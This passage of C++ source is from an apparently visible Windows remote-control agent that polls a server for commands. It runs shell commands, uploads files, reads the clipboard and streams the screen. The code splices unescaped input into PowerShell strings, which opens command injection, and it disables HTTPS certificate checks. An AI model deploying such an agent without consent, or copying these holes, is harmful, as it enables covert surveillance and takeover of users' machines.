        "foreach($a in $f){$v=if($a.DisplayVersion){\\\" v$($a.DisplayVersion)\\\"}else{''};$p=if($a.Publisher){\\\" - $($a.Publisher)\\\"}else{''};$lines+=\\\"  $($a.DisplayName)$v$p\\\"};"
        "$r=$lines -join \\\"`n\\\";"
        "if($r.Length -gt 5000){$r.Substring(0,5000)+'... (truncated)'}else{$r}"
    ), "done"};
}

static CmdResult handle_startup(const std::string& args) {
    return {run_ps(
        "$lines=@('Startup Programs:','');"
        "$reg=Get-ItemProperty 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -EA SilentlyContinue;"
        "if($reg){$lines+='  [User Startup]';$reg.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} | ForEach-Object {$lines+=\\\"    $($_.Name): $($_.Value)\\\"}};"
        "$regM=Get-ItemProperty 'HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -EA SilentlyContinue;"
        "if($regM){$lines+='  [System Startup]';$regM.PSObject.Properties | Where-Object {$_.Name -notlike 'PS*'} | ForEach-Object {$lines+=\\\"    $($_.Name): $($_.Value)\\\"}};"
        "$lines -join \\\"`n\\\""
    ), "done"};
}

static CmdResult handle_services(const std::string& args) {
    return {run_ps(
        "$svcs=Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName;"
        "$lines=@(\\\"Running Services ($($svcs.Count)):\\\",'');"
        "$lines+='{0,-30} {1,-40}' -f 'Name','Display Name';"
        "$lines+='-' * 72;"
        "foreach($s in $svcs){$lines+='{0,-30} {1,-40}' -f $s.Name,$s.DisplayName};"
        "$r=$lines -join \\\"`n\\\";"
        "if($r.Length -gt 5000){$r.Substring(0,5000)+'... (truncated)'}else{$r}"
    ), "done"};
}

static CmdResult handle_network(const std::string& args) {
    return {run_ps(
        "$conns=Get-NetTCPConnection -State Established -EA Stop | Sort-Object RemoteAddress;"
        "$lines=@(\\\"Active Network Connections ($($conns.Count)):\\\",'');"
        "$lines+='{0,-8} {1,-22} {2,-22} {3,-15}' -f 'PID','Local','Remote','Process';"
        "$lines+='-' * 70;"
        "foreach($c in $conns){$proc=try{(Get-Process -Id $c.OwningProcess -EA SilentlyContinue).ProcessName}catch{'?'};$local=\\\"$($c.LocalAddress):$($c.LocalPort)\\\";$remote=\\\"$($c.RemoteAddress):$($c.RemotePort)\\\";$lines+='{0,-8} {1,-22} {2,-22} {3,-15}' -f $c.OwningProcess,$local,$remote,$proc};"
        "$r=$lines -join \\\"`n\\\";"
        "if($r.Length -gt 5000){$r.Substring(0,5000)+'... (truncated)'}else{$r}"
    ), "done"};
}

static CmdResult handle_printers(const std::string& args) {
    return {run_ps(
        "$p=Get-CimInstance Win32_Printer;"
        "if($p){$lines=@(\\\"Printers ($($p.Count)):\\\",'');foreach($pr in $p){$def=if($pr.Default){'  [DEFAULT]'}else{''};$lines+=\\\"  $($pr.Name)$def\\\";$lines+=\\\"    Port: $($pr.PortName)  |  Driver: $($pr.DriverName)\\\";$lines+=''};$lines -join \\\"`n\\\"}else{'No printers found'}"
    ), "done"};
}

static CmdResult handle_say(const std::string& args) {
    std::string msg = args.empty() ? "Hello from Emote Control" : args;
    run_ps("Add-Type -AssemblyName System.Speech;$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;$s.Speak('" + msg + "');$s.Dispose()");
    return {"Spoke: " + msg, "done"};
}

static CmdResult handle_volume(const std::string& args) {
    if (args.empty()) return {"Usage: volume [0-100]", "failed"};
    int vol = atoi(args.c_str());
    if (vol < 0) vol = 0; if (vol > 100) vol = 100;
    run_ps("$w=New-Object -ComObject WScript.Shell;1..50|%{$w.SendKeys([char]174)};$s=[math]::Round(" + std::to_string(vol) + "/2);if($s -gt 0){1..$s|%{$w.SendKeys([char]175)}}");
    return {"Volume set to approximately " + std::to_string(vol) + "%", "done"};
}

static CmdResult handle_wallpaper(const std::string& args) {
    if (args.empty()) return {"Usage: wallpaper [url or local path]", "failed"};
    std::string wp_path = args;
    if (args.substr(0, 7) == "http://" || args.substr(0, 8) == "https://") {
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        wp_path = std::string(tmp) + "ec_wallpaper.jpg";
        run_ps("Invoke-WebRequest -Uri '" + args + "' -OutFile '" + wp_path + "' -UseBasicParsing");
    }
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wp_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    return {"Wallpaper changed to: " + args, "done"};
}

static CmdResult handle_help(const std::string& args) {
    return {"Available commands:\n\n"
        "  --- Screen & System ---\n"
        "  screenshot        - Capture the screen\n"
        "  sysinfo           - System information\n"
        "  processes         - Top 30 processes by RAM\n"
        "  services          - Running Windows services\n"
        "  installed         - List installed programs\n"
        "  startup           - List startup programs\n"
        "  drives            - All drives with space info\n"
        "  battery           - Battery status (laptops)\n\n"
        "  --- Network ---\n"
        "  wifi              - WiFi status and IP info\n"
        "  network           - Active network connections\n"
        "  printers          - Available printers\n\n"
        "  --- Files ---\n"
        "  list_files [path] - List directory contents\n"
        "  download [url]    - Download a file to PC\n"
        "  upload [path]     - Read a file (base64, max 5MB)\n"
        "  clipboard         - Get clipboard text\n\n"
        "  --- Control ---\n"
        "  cmd [command]     - Run a shell command\n"
        "  open [path/url]   - Open a file or URL\n"
        "  kill [name/pid]   - Kill a process\n"
        "  shutdown          - Shut down the PC\n"
        "  restart           - Restart the PC\n"
        "  lock              - Lock the screen\n"
        "  volume [0-100]    - Set system volume\n"
        "  wallpaper [url]   - Change desktop wallpaper\n\n"
        "  --- Alerts ---\n"
        "  notify [msg]      - Windows notification\n"
        "  msgbox [msg]      - Message box popup\n"
        "  say [text]        - Text-to-speech (plays audio)\n\n"
        "  help              - Show this help", "done"};
}

// Command dispatch table
typedef CmdResult (*CmdHandler)(const std::string&);

struct CmdEntry {
    const char* name;
    CmdHandler handler;
};

static CmdEntry COMMANDS[] = {
    {"screenshot", handle_screenshot},
    {"sysinfo", handle_sysinfo},
    {"cmd", handle_cmd},
    {"list_files", handle_list_files},
    {"open", handle_open},
    {"notify", handle_notify},
    {"download", handle_download},
    {"upload", handle_upload},
    {"clipboard", handle_clipboard},
    {"processes", handle_processes},
    {"kill", handle_kill},
    {"shutdown", handle_shutdown},
    {"restart", handle_restart},
    {"lock", handle_lock},
    {"msgbox", handle_msgbox},
    {"wifi", handle_wifi},
    {"battery", handle_battery},
    {"drives", handle_drives},
    {"installed", handle_installed},
    {"startup", handle_startup},
    {"services", handle_services},
    {"network", handle_network},
    {"printers", handle_printers},
    {"say", handle_say},
    {"volume", handle_volume},
    {"wallpaper", handle_wallpaper},
    {"help", handle_help},
    {NULL, NULL}
};

// ============================================================
// AGENT LOGIC
// ============================================================

static bool agent_register() {
    std::string body = "{\"machine_name\":\"" + json_escape(get_machine_name()) +
                       "\",\"hwid\":\"" + get_hwid() + "\"}";
    auto resp = http_request(L"POST", L"/api/agent/register", body, "application/json", "");
    if (resp.status == 200) {
        g_token = json_get(resp.body, "token");
        std::string sid = json_get(resp.body, "session_id");
        if (!sid.empty()) g_session_id = atoi(sid.c_str());
        return !g_token.empty();
    }
    printf("[!] Registration failed (HTTP %d)\n", resp.status);
    return false;
}

static void send_heartbeat() {
    std::string body = "{\"machine_name\":\"" + json_escape(get_machine_name()) + "\"}";
    http_post("/api/agent/heartbeat", body);
}

static void send_result(const std::string& cmd_id, const std::string& text, const std::string& status) {
    std::string body = "{\"result\":\"" + json_escape(text) + "\",\"status\":\"" + status + "\"}";
    http_post("/api/agent/command/" + cmd_id + "/result", body);
}

static void execute_command(const Command& cmd) {
    CmdResult result = {"Unknown command: " + cmd.command, "failed"};

    // Lowercase the command
    std::string name = cmd.command;
    std::transform(name.begin(), name.end(), name.begin(), ::tolower);
    // Trim
    while (!name.empty() && name.back() == ' ') name.pop_back();
    while (!name.empty() && name.front() == ' ') name.erase(name.begin());

    for (int i = 0; COMMANDS[i].name; i++) {
        if (name == COMMANDS[i].name) {
            result = COMMANDS[i].handler(cmd.args);
            break;
        }
    }

    send_result(cmd.id, result.text, result.status);

    if (name == "shutdown" || name == "restart") {
        ExitProcess(0);
    }
}

// ============================================================
// SCREEN STREAMING — DOUBLE-BUFFER PIPELINE
// ============================================================
// Two threads run in parallel for max FPS:
//   Capture thread: GDI capture + JPEG encode → shared buffer
//   Send thread:    shared buffer → WebSocket send
// Capture and send overlap, roughly doubling throughput.

// Shared state for pipeline
static CRITICAL_SECTION g_frame_cs;
static HANDLE g_frame_ready = NULL;
static std::vector<BYTE> g_frame_buf;
static volatile LONG g_ws_alive = 0;
static volatile LONG g_adaptive_quality = 30; // adaptive: 15-50

static DWORD WINAPI capture_loop_thread(LPVOID param) {
    while (InterlockedCompareExchange(&g_stream_requested, 1, 1) &&
           InterlockedCompareExchange(&g_ws_alive, 1, 1)) {
        int q = (int)InterlockedCompareExchange(&g_adaptive_quality, 0, 0);
        if (q == 0) q = 30;
        auto jpeg = capture_screen_jpeg(q);
        if (!jpeg.empty()) {
            EnterCriticalSection(&g_frame_cs);
            g_frame_buf.swap(jpeg);
            LeaveCriticalSection(&g_frame_cs);
            SetEvent(g_frame_ready);
        }
    }
    return 0;
}

static HINTERNET open_stream_websocket() {
    HINTERNET hSession = WinHttpOpen(L"EmoteAgent/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, g_url.host.c_str(), g_url.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    std::string ws_path = "/?role=agent&session=" + std::to_string(g_session_id) + "&token=" + g_token;
    DWORD flags = g_url.https ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", to_wide(ws_path).c_str(),
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    if (g_url.https) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL;
    }

    HINTERNET hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, 0);
    WinHttpCloseHandle(hRequest);
    if (!hWebSocket) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    // 500ms send timeout — drop frames rather than block and go to 0 FPS
    DWORD sendTimeout = 500;
    WinHttpSetOption(hWebSocket, WINHTTP_OPTION_SEND_TIMEOUT, &sendTimeout, sizeof(sendTimeout));

    BYTE recvBuf[512]; DWORD bytesRead = 0; WINHTTP_WEB_SOCKET_BUFFER_TYPE bufType;
    WinHttpWebSocketReceive(hWebSocket, recvBuf, sizeof(recvBuf), &bytesRead, &bufType);
    return hWebSocket;
}

// --- Parallel sender: each sender thread has its own WebSocket connection ---
struct SenderCtx {
    CRITICAL_SECTION* frame_cs;
    HANDLE frame_ready;
    std::vector<BYTE>* frame_buf;
    int id;
};

static DWORD WINAPI sender_thread(LPVOID param) {
    SenderCtx* ctx = (SenderCtx*)param;

    HINTERNET ws = open_stream_websocket();
    if (!ws) {
        printf("  [Sender %d: connect failed]\n", ctx->id);
        return 0;
    }
    printf("  [Sender %d: connected]\n", ctx->id);

    DWORD framesSent = 0;
    DWORD startTick = GetTickCount();
    int failCount = 0;

    while (InterlockedCompareExchange(&g_stream_requested, 1, 1) &&
           InterlockedCompareExchange(&g_ws_alive, 1, 1)) {

        if (WaitForSingleObject(ctx->frame_ready, 500) == WAIT_TIMEOUT) continue;

        std::vector<BYTE> frame;
        EnterCriticalSection(ctx->frame_cs);
        frame.swap(*ctx->frame_buf);
        LeaveCriticalSection(ctx->frame_cs);
        if (frame.empty()) continue;

        DWORD t0 = GetTickCount();
        DWORD err = WinHttpWebSocketSend(ws,
            WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
            (PVOID)frame.data(), (DWORD)frame.size());
        DWORD sendMs = GetTickCount() - t0;

        if (err != ERROR_SUCCESS) {
            failCount++;
            if (failCount >= 3) {
                WinHttpWebSocketClose(ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
                WinHttpCloseHandle(ws);
                Sleep(500);
                ws = open_stream_websocket();
                if (!ws) break;
                failCount = 0;
            }
            continue;
        }
        failCount = 0;
        framesSent++;

        // Adaptive quality: measure FPS every 2 seconds, adjust quality
        DWORD elapsed = GetTickCount() - startTick;
        if (elapsed >= 2000) {
            int fps = (int)(framesSent * 1000 / elapsed);
            int curQ = (int)InterlockedCompareExchange(&g_adaptive_quality, 0, 0);

            if (fps < 20 && curQ > 15) {
                InterlockedExchange(&g_adaptive_quality, curQ - 5);
            } else if (fps > 28 && curQ < 50) {
                InterlockedExchange(&g_adaptive_quality, curQ + 3);
            }

            if (ctx->id == 0) {
                printf("  [Stream: %d FPS, q=%d, send=%lums, %luKB]\r",
                    fps, (int)InterlockedCompareExchange(&g_adaptive_quality, 0, 0),
                    sendMs, (unsigned long)(frame.size() / 1024));
            }
            framesSent = 0;
            startTick = GetTickCount();
        }
    }

    if (ws) {
        WinHttpWebSocketClose(ws, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
        WinHttpCloseHandle(ws);
    }
    return 0;
}

static DWORD WINAPI screen_stream_thread(LPVOID param) {
    InterlockedExchange(&g_streaming, 1);
    printf("  [Screen streaming: connecting...]\n");

    // Test connection first
    HINTERNET testWs = open_stream_websocket();
    if (!testWs) {
        printf("  [Screen WS: connection failed]\n");
        InterlockedExchange(&g_streaming, 0);
        return 0;
    }
    WinHttpWebSocketClose(testWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
    WinHttpCloseHandle(testWs);

    InterlockedExchange(&g_ws_alive, 1);
    InterlockedExchange(&g_adaptive_quality, 30);

    InitializeCriticalSection(&g_frame_cs);
    g_frame_ready = CreateEvent(NULL, TRUE, FALSE, NULL); // Manual reset — all senders see it

    // Start capture thread
    HANDLE hCapture = CreateThread(NULL, 0, capture_loop_thread, NULL, 0, NULL);

    // Start 2 parallel sender threads (doubles throughput through latency)
    const int NUM_SENDERS = 2;
    SenderCtx ctxs[NUM_SENDERS];
    HANDLE hSenders[NUM_SENDERS];
    for (int i = 0; i < NUM_SENDERS; i++) {
        ctxs[i].frame_cs = &g_frame_cs;
        ctxs[i].frame_ready = g_frame_ready;
        ctxs[i].frame_buf = &g_frame_buf;
        ctxs[i].id = i;
        hSenders[i] = CreateThread(NULL, 0, sender_thread, &ctxs[i], 0, NULL);
    }

    printf("  [Screen streaming: %d parallel senders active]\n", NUM_SENDERS);

    // Wait for streaming to be stopped
    while (InterlockedCompareExchange(&g_stream_requested, 1, 1)) {
        Sleep(500);
    }

    // Shutdown
    InterlockedExchange(&g_ws_alive, 0);
    SetEvent(g_frame_ready); // wake up any waiting senders
    WaitForSingleObject(hCapture, 3000);
    CloseHandle(hCapture);
    for (int i = 0; i < NUM_SENDERS; i++) {
        WaitForSingleObject(hSenders[i], 3000);
        CloseHandle(hSenders[i]);
    }
    CloseHandle(g_frame_ready);
    DeleteCriticalSection(&g_frame_cs);

    InterlockedExchange(&g_streaming, 0);
    printf("\n  [Screen streaming stopped]\n");
    return 0;
}

// ============================================================
// HEARTBEAT THREAD
// ============================================================

static DWORD WINAPI heartbeat_thread(LPVOID param) {
    while (true) {
        send_heartbeat();
        Sleep(HEARTBEAT_INTERVAL * 1000);
    }
    return 0;
}

// ============================================================
// COMMAND POLL LOOP
// ============================================================

static void poll_commands() {
    auto resp = http_get("/api/agent/commands");
    if (resp.status != 200) return;

    // Check if server wants screen streaming
    std::string screen = json_get(resp.body, "screen_stream");
    if (screen == "true" && !InterlockedCompareExchange(&g_streaming, 0, 0)) {
        InterlockedExchange(&g_stream_requested, 1);
        CreateThread(NULL, 0, screen_stream_thread, NULL, 0, NULL);
    } else if (screen == "false" || screen.empty()) {
        InterlockedExchange(&g_stream_requested, 0);
    }

    auto cmds = parse_commands(resp.body);
    for (auto& cmd : cmds) {
        printf("  > %s", cmd.command.c_str());
        if (!cmd.args.empty()) printf(" %s", cmd.args.c_str());
        printf("\n");
        execute_command(cmd);
    }
}

// ============================================================
// MAIN
// ============================================================

int main(int argc, char* argv[]) {
    // Make DPI-aware so GetSystemMetrics returns real pixel dimensions
    // (without this, 1920x1080 at 150% scaling reports as 1280x720)
    SetProcessDPIAware();

    // Optional: accept server URL as first arg
    if (argc >= 2) {
        g_server_url = argv[1];
        // Strip trailing slash
        while (!g_server_url.empty() && g_server_url.back() == '/') g_server_url.pop_back();
    }

    if (g_server_url.substr(0, 4) != "http") {
        g_server_url = "https://" + g_server_url;
    }

    g_url = parse_url(g_server_url);

    // Initialize COM (needed for WinHTTP)
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    printf("Emote Control Agent (C++ Native)\n");
    printf("========================================\n");
    printf("Connecting to %s...\n", g_server_url.c_str());

    // Register
    int retries = 0;
    while (!agent_register()) {
        retries++;
        if (retries >= 5) {
            printf("[!] Could not connect after 5 attempts.\n");
            printf("\nPress Enter to exit...\n");
            getchar();
            return 1;
        }
        printf("    Retrying in 5s... (%d/5)\n", retries);
        Sleep(5000);
    }

    printf("Connected! Session is ONLINE.\n");
    printf("Machine: %s\n", get_machine_name().c_str());
    printf("\nListening for commands... (close this window to disconnect)\n\n");

    // Start heartbeat thread
    CreateThread(NULL, 0, heartbeat_thread, NULL, 0, NULL);

    // Poll loop
    while (true) {
        poll_commands();
        Sleep(POLL_INTERVAL * 1000);
    }

    if (g_tjCompressor) tjDestroy(g_tjCompressor);
    CoUninitialize();
    return 0;
}
